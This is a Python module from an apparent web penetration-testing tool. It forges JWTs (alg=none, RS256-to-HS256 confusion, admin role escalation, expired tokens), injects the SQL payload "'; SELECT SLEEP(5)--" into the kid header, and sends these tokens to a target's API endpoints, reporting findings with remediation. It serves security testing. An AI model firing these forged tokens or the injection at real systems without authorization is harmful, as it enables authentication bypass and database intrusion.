"""JWT Security Tester — comprehensive JWT vulnerability testing.

Attack vectors:
  1. "none" algorithm bypass
  2. Algorithm confusion (RS256 → HS256)
  3. Weak secret brute force
  4. kid parameter injection (SQL + path traversal)
  5. jku/x5u header injection (SSRF-style)
  6. Claims manipulation (role escalation)
  7. Expired token acceptance

References:
  - PortSwigger JWT Algorithm Confusion Labs
  - CVE-2025-4692 (algorithm confusion)
  - CVE-2025-30144 (signature verification bypass)
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import time
from dataclasses import dataclass

import httpx

logger = logging.getLogger(__name__)


# ── Data models ───────────────────────────────────────────────────────────────

@dataclass
class JWTFinding:
    title: str
    severity: str
    attack_type: str
    token_modified: str
    endpoint: str
    evidence: str
    remediation: str


# ── Token helpers ─────────────────────────────────────────────────────────────

def b64url_decode(s: str) -> bytes:
    """Base64URL decode with padding."""
    pad = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * pad)


def b64url_encode(b: bytes) -> str:
    """Base64URL encode without padding."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Decode JWT without verification. Return (header, payload, signature) or None."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def forge_none_algorithm(token: str, new_payload: dict | None = None) -> str:
    """Forge JWT with alg=none (no signature).

    If server accepts → Critical auth bypass.
    CVE-2015-9235 class vulnerability.
    """
    decoded = decode_jwt(token)
    if not decoded:
        return token

    _, payload, _ = decoded
    new_header = {"alg": "none", "typ": "JWT"}

    if new_payload:
        payload.update(new_payload)

    header_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def forge_hs256_with_public_key(token: str, public_key_pem: str) -> str:
    """Algorithm confusion: RS256 → HS256 using public key as HMAC secret.

    Attacks implementations that don't validate the algorithm in the JWT header.
    Attacker changes RS256 → HS256, signs with public key as HMAC secret.
    """
    decoded = decode_jwt(token)
    if not decoded:
        return token

    _, payload, _ = decoded
    new_header = {"alg": "HS256", "typ": "JWT"}

    header_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    message = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(
        public_key_pem.encode(),
        message,
        hashlib.sha256,
    ).digest()

    return f"{header_b64}.{payload_b64}.{b64url_encode(signature)}"


def forge_role_escalation(
    token: str,
    role_field: str = "role",
    admin_value: str = "admin",
) -> str:
    """Modify payload to escalate role, keep original algorithm.

    Used with none-algorithm or weak secret attacks.
    Signature is intentionally invalid — tests if server verifies signatures.
    """
    decoded = decode_jwt(token)
    if not decoded:
        return token

    header, payload, _ = decoded

    if role_field in payload:
        payload[role_field] = admin_value
    payload["is_admin"] = True
    payload["admin"] = True

    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    return f"{header_b64}.{payload_b64}.invalidsignature"


# ── JWT extraction ────────────────────────────────────────────────────────────

async def extract_jwt_from_response(response: httpx.Response) -> str | None:
    """Extract JWT from response headers or body."""
    # Authorization header
    auth = response.headers.get("authorization", "")
    if auth.startswith("Bearer "):
        return auth[7:]

    # Set-Cookie (JWT stored in cookies)
    for header_val in response.headers.get_list("set-cookie") if hasattr(response.headers, "get_list") else []:
        for part in header_val.split(";"):
            val_parts = part.strip().split("=", 1)
            if len(val_parts) == 2:
                value = val_parts[1]
                if value.count(".") == 2 and len(value) > 50:
                    if decode_jwt(value):
                        return value

    # Response body JSON — common fields
    try:
        body = response.json()
        for key in ("token", "access_token", "jwt", "auth_token", "id_token", "accessToken"):
            if key in body:
                return str(body[key])
    except Exception:
        pass

    return None


# ── Main tester ───────────────────────────────────────────────────────────────

# Common API paths that return or accept JWTs
_JWT_ENDPOINTS = [
    "/api/user", "/api/me", "/api/profile",
    "/api/v1/me", "/api/v1/user", "/v1/user",
    "/me", "/profile", "/api/auth/refresh", "/auth/refresh",
]

# Common JWT fields used for role/privilege escalation
_ROLE_FIELDS = ["role", "roles", "scope", "permission", "is_admin", "admin", "user_type"]


async def test_jwt_vulnerabilities(
    base_url: str,
    auth_headers: dict | None = None,
    known_jwt: str | None = None,
    scope_check_fn=None,
) -> list[dict]:
    """Run comprehensive JWT vulnerability tests.

    Tests:
      1. None algorithm bypass
      2. Invalid signature acceptance
      3. kid SQL injection (time-based)
      4. Role escalation acceptance

    Args:
        base_url:       Base URL of target (e.g. "https://target.com").
        auth_headers:   Optional pre-authenticated headers.
        known_jwt:      Optional known JWT to test (from auth_headers).
        scope_check_fn: Optional callable(url) -> bool scope enforcer.

    Returns:
        List of finding dicts compatible with Pentra AI finding format.
    """
    if scope_check_fn and not scope_check_fn(base_url):
        return []

    findings: list[dict] = []
    test_jwt = known_jwt
    req_headers: dict[str, str] = dict(auth_headers or {})

    async with httpx.AsyncClient(
        verify=False,  # noqa: S501
        follow_redirects=True,
        timeout=10.0,
    ) as client:

        # Step 1: Collect a JWT from common endpoints if not provided
        if not test_jwt:
            for path in _JWT_ENDPOINTS:
                url = f"{base_url.rstrip('/')}{path}"
                try:
                    resp = await client.get(url, headers=req_headers)
                    jwt = await extract_jwt_from_response(resp)
                    if jwt:
                        test_jwt = jwt
                        logger.info("[jwt] Found JWT at %s", url)
                        break
                except Exception:
                    pass

        if not test_jwt:
            logger.debug("[jwt] No JWT found to test on %s", base_url)
            return []

        decoded = decode_jwt(test_jwt)
        if not decoded:
            return []

        header, payload, _ = decoded
        alg = header.get("alg", "").upper()
        logger.info(
            "[jwt] Testing JWT: alg=%s sub=%s exp=%s",
            alg, payload.get("sub", "?"), payload.get("exp", "?"),
        )

        # ── Attack 1: None algorithm bypass ──────────────────────────────────
        logger.info("[jwt] Attack 1: none algorithm bypass")
        none_token = forge_none_algorithm(test_jwt, new_payload={"role": "admin"})

        for path in _JWT_ENDPOINTS[:3]:
            url = f"{base_url.rstrip('/')}{path}"
            try:
                resp = await client.get(
                    url, headers={**req_headers, "Authorization": f"Bearer {none_token}"},
                )
                if resp.status_code == 200:
                    findings.append({
                        "title": "JWT None Algorithm Authentication Bypass",
                        "severity": "critical",
                        "vuln_class": "JWT_VULNERABILITY",
                        "target_url": url,
                        "description": (
                            "Server accepted a JWT with 'alg: none' (unsigned token). "
                            "This allows an attacker to forge tokens for any user "
                            "without knowing the secret key. "
                            f"Algorithm in original: {alg}"
                        ),
                        "request_raw": f"GET {url}\nAuthorization: Bearer {none_token[:80]}...",
                        "response_raw": resp.text[:300],
                        "source": "jwt_tester",
                        "payload": none_token[:120],
                        "remediation": (
                            "Explicitly reject 'none' algorithm on server side. "
                            "Maintain a strict server-side allowlist of accepted algorithms (e.g. HS256 or RS256 only)."
                        ),
                    })
                    logger.info("[jwt] NONE ALGORITHM BYPASS CONFIRMED at %s", url)
                    break
            except Exception:
                pass

        # ── Attack 2: Invalid signature acceptance ────────────────────────────
        logger.info("[jwt] Attack 2: invalid signature acceptance")
        invalid_sig_token = forge_role_escalation(test_jwt)

        for path in _JWT_ENDPOINTS[:3]:
            url = f"{base_url.rstrip('/')}{path}"
            try:
                resp = await client.get(
                    url, headers={**req_headers, "Authorization": f"Bearer {invalid_sig_token}"},
                )
                if resp.status_code == 200:
                    findings.append({
                        "title": "JWT Signature Not Verified",
                        "severity": "critical",
                        "vuln_class": "JWT_VULNERABILITY",
                        "target_url": url,
                        "description": (
                            "Server accepted a JWT with a deliberately invalid signature string "
                            "'invalidsignature'. The server is NOT verifying JWT signatures, "
                            "allowing complete authentication bypass."
                        ),
                        "request_raw": f"GET {url}\nAuthorization: Bearer {invalid_sig_token[:80]}...",
                        "response_raw": resp.text[:300],
                        "source": "jwt_tester",
                        "payload": invalid_sig_token[:120],
                        "remediation": (
                            "Always verify JWT signatures server-side using a strong secret. "
                            "Use a well-maintained JWT library and never skip signature verification."
                        ),
                    })
                    logger.info("[jwt] INVALID SIGNATURE ACCEPTED at %s", url)
                    break
            except Exception:
                pass

        # ── Attack 3: kid SQL injection (time-based) ──────────────────────────
        if "kid" in header:
            logger.info("[jwt] Attack 3: kid parameter SQL injection")
            header_injected = {**header, "kid": "'; SELECT SLEEP(5)--"}
            h64 = b64url_encode(json.dumps(header_injected, separators=(",", ":")).encode())
            p64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            kid_sqli_token = f"{h64}.{p64}.invalidsig"

            for path in _JWT_ENDPOINTS[:2]:
                url = f"{base_url.rstrip('/')}{path}"
                try:
                    t0 = time.monotonic()
                    await client.get(
                        url, headers={**req_headers, "Authorization": f"Bearer {kid_sqli_token}"},
                    )
                    elapsed = time.monotonic() - t0
                    if elapsed >= 4.5:
                        findings.append({
                            "title": "JWT kid Parameter SQL Injection (Time-Based)",
                            "severity": "high",
                            "vuln_class": "JWT_VULNERABILITY",
                            "target_url": url,
                            "description": (
                                f"JWT 'kid' header parameter is injectable. "
                                f"SLEEP(5) payload caused {elapsed:.1f}s delay, confirming SQL injection."
                            ),
                            "request_raw": f"kid: {header_injected['kid']}",
                            "response_raw": f"Response time: {elapsed:.1f}s (expected <1s)",
                            "source": "jwt_tester",
                            "payload": header_injected["kid"],
                            "remediation": (
                                "Sanitize and validate the 'kid' header value. "
                                "Use parameterized queries for key lookup. "
                                "Restrict 'kid' to alphanumeric characters only."
                            ),
                        })
                        break
                except Exception:
                    pass

        # ── Attack 4: Expired token acceptance ───────────────────────────────
        if "exp" in payload:
            import datetime
            exp = payload.get("exp", 0)
            if exp > 0 and exp > time.time():
                # Forge token with past expiry
                expired_payload = {**payload, "exp": int(time.time()) - 86400}  # 1 day ago
                h64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
                p64 = b64url_encode(json.dumps(expired_payload, separators=(",", ":")).encode())
                # Keep original signature (expired + original sig = should reject)
                expired_token = f"{h64}.{p64}.invalidsig"

                for path in _JWT_ENDPOINTS[:2]:
                    url = f"{base_url.rstrip('/')}{path}"
                    try:
                        resp = await client.get(
                            url, headers={**req_headers, "Authorization": f"Bearer {expired_token}"},
                        )
                        if resp.status_code == 200:
                            findings.append({
                                "title": "JWT Expired Token Accepted",
                                "severity": "medium",
                                "vuln_class": "JWT_VULNERABILITY",
                                "target_url": url,
                                "description": (
                                    "Server accepted an expired JWT token (exp set to 1 day ago). "
                                    "Token expiration is not being validated."
                                ),
                                "request_raw": f"GET {url}\nForged exp: {expired_payload['exp']}",
                                "response_raw": resp.text[:200],
                                "source": "jwt_tester",
                                "remediation": "Validate the 'exp' claim on every authenticated request.",
                            })
                            break
                    except Exception:
                        pass

    if findings:
        logger.info("[jwt] %d JWT vulnerability/vulnerabilities found on %s", len(findings), base_url)
    else:
        logger.debug("[jwt] No JWT vulnerabilities found on %s", base_url)

    return findings


def _extract_jwt_from_state(state: dict) -> str | None:
    """Extract JWT from auth_credentials or headers in state."""
    creds = state.get("auth_credentials")
    if creds and creds.get("type") == "bearer":
        return creds.get("value", "")

    auth_headers = state.get("auth_headers", {})
    auth = auth_headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        return auth[7:]

    return None
